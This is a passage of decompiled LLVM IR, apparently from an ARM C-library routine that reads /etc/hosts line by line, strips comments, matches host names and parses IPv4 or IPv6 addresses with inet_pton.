  %tmp81 = icmp ult i32 %v1_1b458, 8
  br i1 %tmp81, label %dec_label_pc_1b6fc, label %dec_label_pc_1b464

dec_label_pc_1b464:                               ; preds = %dec_label_pc_1b458
  %v0_1b464 = load i32, i32* @r8, align 4
  %tmp82 = icmp ult i32 %v0_1b464, 16
  br i1 %tmp82, label %dec_label_pc_1b6fc, label %dec_label_pc_1b46c

dec_label_pc_1b46c:                               ; preds = %dec_label_pc_1b464
  %v1_1b46c = add i32 %v0_1b458, -48
  store i32 %v1_1b46c, i32* %r3.global-to-local, align 4
  %tmp83 = icmp ult i32 %v1_1b46c, 8
  br i1 %tmp83, label %dec_label_pc_1b6fc, label %dec_label_pc_1b478

dec_label_pc_1b478:                               ; preds = %dec_label_pc_1b46c
  %v1_1b478 = add i32 %v0_1b458, -44
  store i32 %v1_1b478, i32* @r8, align 4
  %v1_1b47c = add i32 %v0_1b458, -56
  store i32 %v1_1b47c, i32* %r3.global-to-local, align 4
  %v3_1b480 = icmp ult i32 %v1_1b47c, %v1_1b478
  br i1 %v3_1b480, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_1b478
  %v1_1b488 = load i32, i32* @r4, align 4
  %v2_1b488 = add i32 %v1_1b488, 44
  br label %bb74

.thread1:                                         ; preds = %dec_label_pc_1b478
  store i32 %v1_1b47c, i32* @r8, align 4
  %v1_1b48c.pre = load i32, i32* @r4, align 4
  %v2_1b48c = add i32 %v1_1b48c.pre, 56
  br label %bb74

bb74:                                             ; preds = %bb, %.thread1
  %storemerge = phi i32 [ %v2_1b48c, %.thread1 ], [ %v2_1b488, %bb ]
  %v0_1b494 = phi i32 [ %v1_1b48c.pre, %.thread1 ], [ %v1_1b488, %bb ]
  %v0_1b490 = phi i32 [ %v1_1b47c, %.thread1 ], [ %v1_1b478, %bb ]
  store i32 %storemerge, i32* @r5, align 4
  %v1_1b494 = add i32 %v0_1b494, 36
  store i32 %v1_1b494, i32* @r6, align 4
  %v1_1b498 = add i32 %v0_1b494, 48
  store i32 %v1_1b498, i32* %sl.global-to-local, align 4
  %tmp84 = icmp ult i32 %v0_1b490, 80
  br i1 %tmp84, label %dec_label_pc_1b6fc, label %dec_label_pc_1b4a0

dec_label_pc_1b4a0:                               ; preds = %bb74
  %v0_1b4a0 = call i32 @__open_etc_hosts()
  store i32 %v0_1b4a0, i32* %r0.global-to-local, align 4
  %v2_1b4a4 = icmp eq i32 %v0_1b4a0, 0
  br i1 %v2_1b4a4, label %dec_label_pc_1b4c0, label %.thread

.thread:                                          ; preds = %dec_label_pc_1b4a0
  %v1_1b4ac = load i32, i32* @fp, align 4
  store i32 %v1_1b4ac, i32* @r7, align 4
  %v1_1b4b0 = load i32, i32* @r5, align 4
  store i32 %v1_1b4b0, i32* @fp, align 4
  %v1_1b4b4 = load i32, i32* @r6, align 4
  %v1_1b4b8 = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_1b574

dec_label_pc_1b4c0:                               ; preds = %dec_label_pc_1b4a0
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %tmp53, i32* %r2.global-to-local, align 4
  %v2_1b4c8 = inttoptr i32 %tmp53 to i32*
  store i32 0, i32* %v2_1b4c8, align 4
  %v0_1b4cc = call i32 @__errno_location()
  store i32 %v0_1b4cc, i32* %r0.global-to-local, align 4
  %v1_1b4d0 = inttoptr i32 %v0_1b4cc to i32*
  %v2_1b4d0 = load i32, i32* %v1_1b4d0, align 4
  store i32 %v2_1b4d0, i32* @sl, align 4
  br label %dec_label_pc_1b700

dec_label_pc_1b4d8:                               ; preds = %dec_label_pc_1b688
  %v0_1b4d8 = load i32, i32* @r4, align 4
  %v1_1b4d8 = add i32 %v0_1b4d8, 4
  %v2_1b4d8 = inttoptr i32 %v1_1b4d8 to i32*
  %v3_1b4d8 = load i32, i32* %v2_1b4d8, align 4
  %v1_1b4dc = load i32, i32* @sb, align 4
  %v2_1b4dc = inttoptr i32 %v1_1b4dc to i32*
  store i32 %v3_1b4d8, i32* %v2_1b4dc, align 4
  store i32 %stack_var_-48.1, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %tmp53, i32* %ip.global-to-local, align 4
  %v0_1b4f0 = load i32, i32* @r4, align 4
  %v1_1b4f0 = add i32 %v0_1b4f0, 8
  store i32 %v1_1b4f0, i32* %r1.global-to-local, align 4
  %v1_1b4f4 = load i32, i32* @sb, align 4
  %v2_1b4f4 = add i32 %v1_1b4f4, 8
  %v3_1b4f4 = inttoptr i32 %v2_1b4f4 to i32*
  store i32 2, i32* %v3_1b4f4, align 4
  %v0_1b4f8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_1b4f8, i32* @sl, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v0_1b500 = load i32, i32* @sb, align 4
  %v1_1b500 = load i32, i32* %ip.global-to-local, align 4
  %v2_1b500 = inttoptr i32 %v1_1b500 to i32*
  store i32 %v0_1b500, i32* %v2_1b500, align 4
  %v0_1b504 = load i32, i32* @r7, align 4
  %v1_1b504 = load i32, i32* %r0.global-to-local, align 4
  %v2_1b504 = inttoptr i32 %v1_1b504 to i32*
  store i32 %v0_1b504, i32* %v2_1b504, align 4
  %v0_1b508 = load i32, i32* %r3.global-to-local, align 4
  %v1_1b508 = load i32, i32* @sb, align 4
  %v2_1b508 = add i32 %v1_1b508, 12
  %v3_1b508 = inttoptr i32 %v2_1b508 to i32*
  store i32 %v0_1b508, i32* %v3_1b508, align 4
  %v0_1b50c = load i32, i32* %r0.global-to-local, align 4
  %v1_1b50c = load i32, i32* @sb, align 4
  %v2_1b50c = add i32 %v1_1b50c, 16
  %v3_1b50c = inttoptr i32 %v2_1b50c to i32*
  store i32 %v0_1b50c, i32* %v3_1b50c, align 4
  %v0_1b510 = load i32, i32* %r1.global-to-local, align 4
  %v1_1b510 = load i32, i32* @sb, align 4
  %v2_1b510 = add i32 %v1_1b510, 4
  %v3_1b510 = inttoptr i32 %v2_1b510 to i32*
  store i32 %v0_1b510, i32* %v3_1b510, align 4
  %v0_1b514 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b514 = load i32, i32* %r0.global-to-local, align 4
  %v2_1b514 = add i32 %v1_1b514, 4
  %v3_1b514 = inttoptr i32 %v2_1b514 to i32*
  store i32 %v0_1b514, i32* %v3_1b514, align 4
  br label %dec_label_pc_1b6e4

dec_label_pc_1b51c:                               ; preds = %dec_label_pc_1b6b0
  store i32 %tmp53, i32* %ip.global-to-local, align 4
  %v0_1b520 = load i32, i32* @r4, align 4
  %v1_1b520 = add i32 %v0_1b520, 4
  %v2_1b520 = inttoptr i32 %v1_1b520 to i32*
  %v3_1b520 = load i32, i32* %v2_1b520, align 4
  store i32 %v3_1b520, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-40.1, i32* %r0.global-to-local, align 4
  %v0_1b528 = load i32, i32* @sb, align 4
  %v2_1b528 = inttoptr i32 %tmp53 to i32*
  store i32 %v0_1b528, i32* %v2_1b528, align 4
  store i32 %v0_1b580, i32* %ip.global-to-local, align 4
  %v0_1b530 = load i32, i32* %r3.global-to-local, align 4
  %v1_1b530 = load i32, i32* @sb, align 4
  %v2_1b530 = inttoptr i32 %v1_1b530 to i32*
  store i32 %v0_1b530, i32* %v2_1b530, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_1b53c = load i32, i32* %ip.global-to-local, align 4
  %v1_1b53c = load i32, i32* %r0.global-to-local, align 4
  %v2_1b53c = inttoptr i32 %v1_1b53c to i32*
  store i32 %v0_1b53c, i32* %v2_1b53c, align 4
  %v0_1b540 = load i32, i32* %r3.global-to-local, align 4
  %v1_1b540 = load i32, i32* @sb, align 4
  %v2_1b540 = add i32 %v1_1b540, 12
  %v3_1b540 = inttoptr i32 %v2_1b540 to i32*
  store i32 %v0_1b540, i32* %v3_1b540, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-40.1, i32* %r3.global-to-local, align 4
  %v0_1b54c = load i32, i32* @r4, align 4
  %v1_1b54c = add i32 %v0_1b54c, 8
  store i32 %v1_1b54c, i32* %r1.global-to-local, align 4
  %v0_1b550 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_1b550, i32* @sl, align 4
  %v1_1b554 = load i32, i32* @sb, align 4
  %v2_1b554 = add i32 %v1_1b554, 8
  %v3_1b554 = inttoptr i32 %v2_1b554 to i32*
  store i32 10, i32* %v3_1b554, align 4
  %v0_1b558 = load i32, i32* %r3.global-to-local, align 4
  %v1_1b558 = load i32, i32* @sb, align 4
  %v2_1b558 = add i32 %v1_1b558, 16
  %v3_1b558 = inttoptr i32 %v2_1b558 to i32*
  store i32 %v0_1b558, i32* %v3_1b558, align 4
  %v0_1b55c = load i32, i32* %r1.global-to-local, align 4
  %v1_1b55c = load i32, i32* @sb, align 4
  %v2_1b55c = add i32 %v1_1b55c, 4
  %v3_1b55c = inttoptr i32 %v2_1b55c to i32*
  store i32 %v0_1b55c, i32* %v3_1b55c, align 4
  %v0_1b560 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b560 = load i32, i32* %r3.global-to-local, align 4
  %v2_1b560 = add i32 %v1_1b560, 4
  %v3_1b560 = inttoptr i32 %v2_1b560 to i32*
  store i32 %v0_1b560, i32* %v3_1b560, align 4
  br label %dec_label_pc_1b6e4

dec_label_pc_1b568:                               ; preds = %dec_label_pc_1b430
  store i32 0, i32* @r7, align 4
  %.pre = inttoptr i32 %tmp56 to i32*
  br label %dec_label_pc_1b574

dec_label_pc_1b574:                               ; preds = %.thread, %dec_label_pc_1b568
  %v2_1b584.pre-phi = phi i32* [ %v2_1b450, %.thread ], [ %.pre, %dec_label_pc_1b568 ]
  %v0_1b580 = phi i32 [ %v1_1b4ac, %.thread ], [ 0, %dec_label_pc_1b568 ]
  %stack_var_-40.1 = phi i32 [ %v1_1b4b8, %.thread ], [ 0, %dec_label_pc_1b568 ]
  %stack_var_-48.1 = phi i32 [ %v1_1b4b4, %.thread ], [ 0, %dec_label_pc_1b568 ]
  %stack_var_-52.0 = phi i32 [ %v0_1b4a0, %.thread ], [ %v0_1b400, %dec_label_pc_1b568 ]
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 %tmp56, i32* %ip.global-to-local, align 4
  store i32 1, i32* @sl, align 4
  store i32 1, i32* %v2_1b584.pre-phi, align 4
  %v2_1b648 = inttoptr i32 %v0_1b404 to i8*
  %v7_1b680 = icmp eq i32 %v0_1b3fc, 2
  %v7_1b6a8 = icmp eq i32 %v0_1b3fc, 10
  br label %dec_label_pc_1b6cc

dec_label_pc_1b58c:                               ; preds = %dec_label_pc_1b6cc
  %v0_1b58c = load i32, i32* @fp, align 4
  store i32 %v0_1b58c, i32* %r0.global-to-local, align 4
  store i32 35, i32* %r1.global-to-local, align 4
  %v2_1b594 = call i32 @__GI_strchr(i32 %v0_1b58c, i32 35)
  store i32 %v2_1b594, i32* %r0.global-to-local, align 4
  %v3_1b598 = icmp eq i32 %v2_1b594, 0
  br i1 %v3_1b598, label %.thread10, label %bb75

.thread10:                                        ; preds = %dec_label_pc_1b58c
  %v0_1b5a011 = load i32, i32* @fp, align 4
  store i32 %v0_1b5a011, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  br label %dec_label_pc_1b60c.preheader

bb75:                                             ; preds = %dec_label_pc_1b58c
  %v3_1b594 = inttoptr i32 %v2_1b594 to i8*
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1b5a0 = load i32, i32* @fp, align 4
  store i32 %v0_1b5a0, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i8 0, i8* %v3_1b594, align 1
  %v0_1b60c30.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1b60c.preheader

dec_label_pc_1b60c.preheader:                     ; preds = %bb75, %.thread10
  %v0_1b60c30 = phi i32 [ %v0_1b60c30.pre, %bb75 ], [ %v0_1b5a011, %.thread10 ]
  %v1_1b60c31 = inttoptr i32 %v0_1b60c30 to i8*
  %v2_1b60c32 = load i8, i8* %v1_1b60c31, align 1
  %v3_1b60c33 = zext i8 %v2_1b60c32 to i32
  store i32 %v3_1b60c33, i32* %r3.global-to-local, align 4
  %v2_1b61034 = icmp eq i8 %v2_1b60c32, 0
  br i1 %v2_1b61034, label %dec_label_pc_1b618, label %dec_label_pc_1b5b8.preheader

dec_label_pc_1b5b0:                               ; preds = %dec_label_pc_1b5c4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_1b5b4 = inttoptr i32 %v8_1b5dc to i8*
  store i8 0, i8* %v3_1b5b4, align 1
  %v4_1b5b4 = load i32, i32* %r2.global-to-local, align 4
  %v5_1b5b4 = add i32 %v4_1b5b4, 1
  store i32 %v5_1b5b4, i32* %r2.global-to-local, align 4
  %v1_1b5b8 = inttoptr i32 %v5_1b5b4 to i8*
  %v2_1b5b8 = load i8, i8* %v1_1b5b8, align 1
  %v3_1b5b8 = zext i8 %v2_1b5b8 to i32
  store i32 %v3_1b5b8, i32* %r1.global-to-local, align 4
  %v2_1b5bc = icmp eq i8 %v2_1b5b8, 0
  br i1 %v2_1b5bc, label %dec_label_pc_1b618, label %dec_label_pc_1b5c4

dec_label_pc_1b5c4:                               ; preds = %dec_label_pc_1b5b8.preheader, %dec_label_pc_1b5b0
  %v8_1b5dc = phi i32 [ %v5_1b5b4, %dec_label_pc_1b5b0 ], [ %v0_1b5b820, %dec_label_pc_1b5b8.preheader ]
  %v1_1b5cc = phi i32 [ %v3_1b5b8, %dec_label_pc_1b5b0 ], [ %v3_1b5b823, %dec_label_pc_1b5b8.preheader ]
  %v2_1b5c8 = load i32, i32* @global_var_288c8, align 4
  store i32 %v2_1b5c8, i32* %r3.global-to-local, align 4
  %v3_1b5cc = mul nuw nsw i32 %v1_1b5cc, 2
  %v4_1b5cc = add i32 %v3_1b5cc, %v2_1b5c8
  %v5_1b5cc = inttoptr i32 %v4_1b5cc to i8*
  %v6_1b5cc = load i8, i8* %v5_1b5cc, align 1
  %v8_1b5cc = zext i8 %v6_1b5cc to i32
  store i32 %v8_1b5cc, i32* %r3.global-to-local, align 4
  %v1_1b5d0 = and i32 %v8_1b5cc, 32
  %v2_1b5d0 = icmp eq i32 %v1_1b5d0, 0
  br i1 %v2_1b5d0, label %dec_label_pc_1b5d8, label %dec_label_pc_1b5b0

dec_label_pc_1b5d8:                               ; preds = %dec_label_pc_1b5c4
  %v0_1b5d8 = load i32, i32* @r6, align 4
  %v7_1b5dc = icmp slt i32 %v0_1b5d8, 7
  br i1 %v7_1b5dc, label %bb76, label %dec_label_pc_1b5ec.preheader

bb76:                                             ; preds = %dec_label_pc_1b5d8
  %v9_1b5dc = load i32, i32* @r4, align 4
  %v13_1b5dc = mul i32 %v0_1b5d8, 4
  %v14_1b5dc = add i32 %v9_1b5dc, %v13_1b5dc
  %v15_1b5dc = inttoptr i32 %v14_1b5dc to i32*
  store i32 %v8_1b5dc, i32* %v15_1b5dc, align 4
  %v8_1b5e0 = load i32, i32* @r6, align 4
  %v9_1b5e0 = add i32 %v8_1b5e0, 1
  store i32 %v9_1b5e0, i32* @r6, align 4
  %v0_1b5ec25.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1b5ec.preheader

dec_label_pc_1b5ec.preheader:                     ; preds = %bb76, %dec_label_pc_1b5d8
  %v0_1b5ec25 = phi i32 [ %v0_1b5ec25.pre, %bb76 ], [ %v8_1b5dc, %dec_label_pc_1b5d8 ]
  %v1_1b5ec26 = inttoptr i32 %v0_1b5ec25 to i8*
  %v2_1b5ec27 = load i8, i8* %v1_1b5ec26, align 1
  %v3_1b5ec28 = zext i8 %v2_1b5ec27 to i32
  store i32 %v3_1b5ec28, i32* %r1.global-to-local, align 4
  %v2_1b5f029 = icmp eq i8 %v2_1b5ec27, 0
  br i1 %v2_1b5f029, label %dec_label_pc_1b60c.loopexit, label %dec_label_pc_1b5f8.lr.ph

dec_label_pc_1b5f8.lr.ph:                         ; preds = %dec_label_pc_1b5ec.preheader
  %v2_1b5fc.pre = load i32, i32* @global_var_288c8, align 4
  br label %dec_label_pc_1b5f8

dec_label_pc_1b5e8:                               ; preds = %dec_label_pc_1b5f8
  %v1_1b5e8 = add i32 %v0_1b5e8, 1
  store i32 %v1_1b5e8, i32* %r2.global-to-local, align 4
  %v1_1b5ec = inttoptr i32 %v1_1b5e8 to i8*
  %v2_1b5ec = load i8, i8* %v1_1b5ec, align 1
  %v3_1b5ec = zext i8 %v2_1b5ec to i32
  store i32 %v3_1b5ec, i32* %r1.global-to-local, align 4
  %v2_1b5f0 = icmp eq i8 %v2_1b5ec, 0
  br i1 %v2_1b5f0, label %dec_label_pc_1b60c.loopexit, label %dec_label_pc_1b5f8

dec_label_pc_1b5f8:                               ; preds = %dec_label_pc_1b5f8.lr.ph, %dec_label_pc_1b5e8
  %v0_1b5e8 = phi i32 [ %v0_1b5ec25, %dec_label_pc_1b5f8.lr.ph ], [ %v1_1b5e8, %dec_label_pc_1b5e8 ]
  %v1_1b600 = phi i32 [ %v3_1b5ec28, %dec_label_pc_1b5f8.lr.ph ], [ %v3_1b5ec, %dec_label_pc_1b5e8 ]
  store i32 %v2_1b5fc.pre, i32* %r3.global-to-local, align 4
  %v3_1b600 = mul nuw nsw i32 %v1_1b600, 2
  %v4_1b600 = add i32 %v3_1b600, %v2_1b5fc.pre
  %v5_1b600 = inttoptr i32 %v4_1b600 to i8*
  %v6_1b600 = load i8, i8* %v5_1b600, align 1
  %v8_1b600 = zext i8 %v6_1b600 to i32
  store i32 %v8_1b600, i32* %r3.global-to-local, align 4
  %v1_1b604 = and i32 %v8_1b600, 32
  %v2_1b604 = icmp eq i32 %v1_1b604, 0
  br i1 %v2_1b604, label %dec_label_pc_1b5e8, label %dec_label_pc_1b60c.loopexit

dec_label_pc_1b60c.loopexit:                      ; preds = %dec_label_pc_1b5f8, %dec_label_pc_1b5e8, %dec_label_pc_1b5ec.preheader
  %v0_1b60c = phi i32 [ %v0_1b5ec25, %dec_label_pc_1b5ec.preheader ], [ %v0_1b5e8, %dec_label_pc_1b5f8 ], [ %v1_1b5e8, %dec_label_pc_1b5e8 ]
  %v1_1b60c = inttoptr i32 %v0_1b60c to i8*
  %v2_1b60c = load i8, i8* %v1_1b60c, align 1
  %v3_1b60c = zext i8 %v2_1b60c to i32
  store i32 %v3_1b60c, i32* %r3.global-to-local, align 4
  %v2_1b610 = icmp eq i8 %v2_1b60c, 0
  br i1 %v2_1b610, label %dec_label_pc_1b618, label %dec_label_pc_1b5b8.preheader

dec_label_pc_1b5b8.preheader:                     ; preds = %dec_label_pc_1b60c.preheader, %dec_label_pc_1b60c.loopexit
  %v0_1b5b820 = phi i32 [ %v0_1b60c, %dec_label_pc_1b60c.loopexit ], [ %v0_1b60c30, %dec_label_pc_1b60c.preheader ]
  %v1_1b5b821 = inttoptr i32 %v0_1b5b820 to i8*
  %v2_1b5b822 = load i8, i8* %v1_1b5b821, align 1
  %v3_1b5b823 = zext i8 %v2_1b5b822 to i32
  store i32 %v3_1b5b823, i32* %r1.global-to-local, align 4
  %v2_1b5bc24 = icmp eq i8 %v2_1b5b822, 0
  br i1 %v2_1b5bc24, label %dec_label_pc_1b618, label %dec_label_pc_1b5c4

dec_label_pc_1b618:                               ; preds = %dec_label_pc_1b60c.loopexit, %dec_label_pc_1b5b8.preheader, %dec_label_pc_1b5b0, %dec_label_pc_1b60c.preheader
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1b61c = load i32, i32* @r6, align 4
  %v1_1b620 = load i32, i32* @r4, align 4
  %v5_1b620 = mul i32 %v0_1b61c, 4
  %v6_1b620 = add i32 %v1_1b620, %v5_1b620
  %v7_1b620 = inttoptr i32 %v6_1b620 to i32*
  store i32 0, i32* %v7_1b620, align 4
  %v7_1b624 = icmp sgt i32 %v0_1b61c, 1
  br i1 %v7_1b624, label %dec_label_pc_1b628, label %dec_label_pc_1b6cc

dec_label_pc_1b628:                               ; preds = %dec_label_pc_1b618
  %v2_1b628 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_1b628, i32* %r0.global-to-local, align 4
  %v7_1b62c = icmp eq i32 %v2_1b628, 1
  br i1 %v7_1b62c, label %dec_label_pc_1b700, label %dec_label_pc_1b634

dec_label_pc_1b634:                               ; preds = %dec_label_pc_1b628
  %v7_1b634 = icmp eq i32 %v2_1b628, 2
  br i1 %v7_1b634, label %dec_label_pc_1b640, label %dec_label_pc_1b66c.preheader

dec_label_pc_1b66c.preheader:                     ; preds = %dec_label_pc_1b634
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_1b66c

dec_label_pc_1b640:                               ; preds = %dec_label_pc_1b634
  store i32 %v0_1b404, i32* %r0.global-to-local, align 4
  %v0_1b644 = load i32, i32* @r4, align 4
  %v1_1b644 = inttoptr i32 %v0_1b644 to i32*
  %v2_1b644 = load i32, i32* %v1_1b644, align 4
  store i32 %v2_1b644, i32* @r1, align 4
  %v3_1b648 = call i32 @__GI_strcoll(i8* %v2_1b648, i32 %v2_1b644)
  store i32 %v3_1b648, i32* %r0.global-to-local, align 4
  %v2_1b64c = icmp eq i32 %v3_1b648, 0
  br i1 %v2_1b64c, label %dec_label_pc_1b67c, label %dec_label_pc_1b6cc

dec_label_pc_1b658:                               ; preds = %dec_label_pc_1b66c
  %v0_1b658 = load i32, i32* @r4, align 4
  %v4_1b658 = mul i32 %v1_1b658, 4
  %v5_1b658 = add i32 %v0_1b658, %v4_1b658
  %v6_1b658 = inttoptr i32 %v5_1b658 to i32*
  %v7_1b658 = load i32, i32* %v6_1b658, align 4
  store i32 %v7_1b658, i32* %r1.global-to-local, align 4
  %v3_1b65c = call i32 @__GI_strcasecmp(i8* %v2_1b648, i32 %v7_1b658)
  store i32 %v3_1b65c, i32* %r0.global-to-local, align 4
  %v2_1b660 = icmp eq i32 %v3_1b65c, 0
  %v0_1b664 = load i32, i32* @r5, align 4
  %v1_1b664 = add i32 %v0_1b664, 1
  store i32 %v1_1b664, i32* @r5, align 4
  br i1 %v2_1b660, label %dec_label_pc_1b67c, label %dec_label_pc_1b66c

dec_label_pc_1b66c:                               ; preds = %dec_label_pc_1b66c.preheader, %dec_label_pc_1b658
  %v1_1b658 = phi i32 [ 1, %dec_label_pc_1b66c.preheader ], [ %v1_1b664, %dec_label_pc_1b658 ]
  %v1_1b66c = load i32, i32* @r6, align 4
  store i32 %v0_1b404, i32* %r0.global-to-local, align 4
  %v5_1b674 = icmp slt i32 %v1_1b658, %v1_1b66c
  br i1 %v5_1b674, label %dec_label_pc_1b658, label %dec_label_pc_1b6cc

dec_label_pc_1b67c:                               ; preds = %dec_label_pc_1b658, %dec_label_pc_1b640
  store i32 %v0_1b3fc, i32* %r1.global-to-local, align 4
  br i1 %v7_1b680, label %dec_label_pc_1b688, label %dec_label_pc_1b6a4

dec_label_pc_1b688:                               ; preds = %dec_label_pc_1b67c
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_1b68c = load i32, i32* @r7, align 4
  store i32 %v0_1b68c, i32* %r2.global-to-local, align 4
  %v0_1b690 = load i32, i32* @r4, align 4
  %v1_1b690 = inttoptr i32 %v0_1b690 to i32*
  %v2_1b690 = load i32, i32* %v1_1b690, align 4
  store i32 %v2_1b690, i32* %r1.global-to-local, align 4
  %v3_1b694 = inttoptr i32 %v2_1b690 to i8*
  %v4_1b694 = call i32 @inet_pton(i32 2, i8* %v3_1b694, i32 %v0_1b68c)
  store i32 %v4_1b694, i32* %r0.global-to-local, align 4
  %v5_1b69c = icmp sgt i32 %v4_1b694, 0
  br i1 %v5_1b69c, label %dec_label_pc_1b4d8, label %dec_label_pc_1b6c8

dec_label_pc_1b6a4:                               ; preds = %dec_label_pc_1b67c
  store i32 %v0_1b3fc, i32* %r2.global-to-local, align 4
  br i1 %v7_1b6a8, label %dec_label_pc_1b6b0, label %dec_label_pc_1b6c8

dec_label_pc_1b6b0:                               ; preds = %dec_label_pc_1b6a4
  store i32 10, i32* %r0.global-to-local, align 4
  %v0_1b6b4 = load i32, i32* @r4, align 4
  %v1_1b6b4 = inttoptr i32 %v0_1b6b4 to i32*
  %v2_1b6b4 = load i32, i32* %v1_1b6b4, align 4
  store i32 %v2_1b6b4, i32* %r1.global-to-local, align 4
  store i32 %v0_1b580, i32* %r2.global-to-local, align 4
  %v3_1b6bc = inttoptr i32 %v2_1b6b4 to i8*
  %v4_1b6bc = call i32 @inet_pton(i32 10, i8* %v3_1b6bc, i32 %v0_1b580)
  store i32 %v4_1b6bc, i32* %r0.global-to-local, align 4
  %v5_1b6c4 = icmp sgt i32 %v4_1b6bc, 0
  br i1 %v5_1b6c4, label %dec_label_pc_1b51c, label %dec_label_pc_1b6c8

dec_label_pc_1b6c8:                               ; preds = %dec_label_pc_1b688, %dec_label_pc_1b6a4, %dec_label_pc_1b6b0
  store i32 2, i32* @sl, align 4
  br label %dec_label_pc_1b6cc

dec_label_pc_1b6cc:                               ; preds = %dec_label_pc_1b66c, %dec_label_pc_1b640, %dec_label_pc_1b618, %dec_label_pc_1b6c8, %dec_label_pc_1b574
  %v0_1b6cc = load i32, i32* @fp, align 4
  store i32 %v0_1b6cc, i32* %r0.global-to-local, align 4
  %v0_1b6d0 = load i32, i32* @r8, align 4
  store i32 %v0_1b6d0, i32* %r1.global-to-local, align 4
  store i32 %stack_var_-52.0, i32* %r2.global-to-local, align 4
  %v3_1b6d8 = call i32 @fgets(i32 %v0_1b6cc, i32 %v0_1b6d0, i32 %stack_var_-52.0)
  store i32 %v3_1b6d8, i32* %r0.global-to-local, align 4
  %v2_1b6dc = icmp eq i32 %v3_1b6d8, 0
  br i1 %v2_1b6dc, label %dec_label_pc_1b6e4, label %dec_label_pc_1b58c

dec_label_pc_1b6e4:                               ; preds = %dec_label_pc_1b6cc, %dec_label_pc_1b51c, %dec_label_pc_1b4d8
  %v2_1b6e4 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_1b6e4, i32* %r3.global-to-local, align 4
  %v7_1b6e8 = icmp eq i32 %v2_1b6e4, 1
  br i1 %v7_1b6e8, label %dec_label_pc_1b700, label %dec_label_pc_1b6f0

dec_label_pc_1b6f0:                               ; preds = %dec_label_pc_1b6e4
  store i32 %stack_var_-52.0, i32* %r0.global-to-local, align 4
  %v1_1b6f4 = inttoptr i32 %stack_var_-52.0 to i8*
  %v2_1b6f4 = call i32 @__GI_fclose(i8* %v1_1b6f4)
  store i32 %v2_1b6f4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1b700

dec_label_pc_1b6fc:                               ; preds = %dec_label_pc_1b418, %bb74, %dec_label_pc_1b46c, %dec_label_pc_1b464, %dec_label_pc_1b458, %dec_label_pc_1b444, %dec_label_pc_1b428
  store i32 34, i32* @sl, align 4
  br label %dec_label_pc_1b700

dec_label_pc_1b700:                               ; preds = %dec_label_pc_1b628, %dec_label_pc_1b6e4, %dec_label_pc_1b6f0, %dec_label_pc_1b4c0, %dec_label_pc_1b6fc
  %v0_1b700 = load i32, i32* @sl, align 4
  store i32 %v0_1b700, i32* %r0.global-to-local, align 4
  store i32 %v3_1b3e8, i32* @r4, align 4
  store i32 %v6_1b3e8, i32* @r5, align 4
  store i32 %v12_1b3e8, i32* @r7, align 4
  store i32 %v15_1b3e8, i32* @r8, align 4
  store i32 %v21_1b3e8, i32* @sl, align 4
  store i32 %v24_1b3e8, i32* @fp, align 4
  ret i32 %v0_1b700

; uselistorder directives
  uselistorder i32 %v1_1b658, { 1, 0 }
  uselistorder i32 %v0_1b61c, { 1, 0 }
  uselistorder i32 %v3_1b5b823, { 1, 0 }
  uselistorder i32 %v0_1b5b820, { 1, 0 }
  uselistorder i32 %v2_1b594, { 1, 0, 2 }
  uselistorder i32 %stack_var_-52.0, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-40.1, { 1, 0 }
  uselistorder i32 %v0_1b494, { 1, 0 }
  uselistorder i32 %v0_1b458, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1b43c, { 1, 0 }
  uselistorder i32 %v0_1b408, { 1, 0, 2 }
  uselistorder i32 %v0_1b3fc, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1b3f8, { 4, 2, 3, 1, 0 }
  uselistorder i32 %tmp61, { 1, 0, 3, 2 }
  uselistorder i32 %tmp57, { 0, 2, 3, 1 }
  uselistorder i32 %tmp56, { 3, 0, 1, 2 }
  uselistorder i32 %tmp53, { 0, 4, 3, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 1, 11, 17, 12, 13, 14, 15, 16, 0, 18, 19, 2, 3, 4, 5, 6, 7, 8, 9, 10, 20, 21, 22, 23, 24 }
  uselistorder i32* %r2.global-to-local, { 16, 4, 5, 9, 10, 12, 11, 13, 14, 15, 0, 1, 2, 3, 6, 7, 8, 17, 19, 18, 20 }
  uselistorder i32* %r1.global-to-local, { 13, 4, 7, 8, 9, 0, 10, 1, 11, 12, 2, 3, 5, 6, 14 }
  uselistorder i32* %r0.global-to-local, { 0, 5, 1, 22, 21, 11, 6, 13, 12, 14, 15, 18, 16, 17, 20, 19, 2, 3, 4, 7, 8, 9, 10, 23, 25, 24 }
  uselistorder i32* %ip.global-to-local, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 34, { 6, 2, 3, 0, 8, 9, 7, 1, 4, 5 }
  uselistorder i32 (i32, i32, i32)* @fgets, { 2, 1, 0 }
  uselistorder i32 (i8*, i32)* @__GI_strcoll, { 25, 27, 28, 29, 26, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
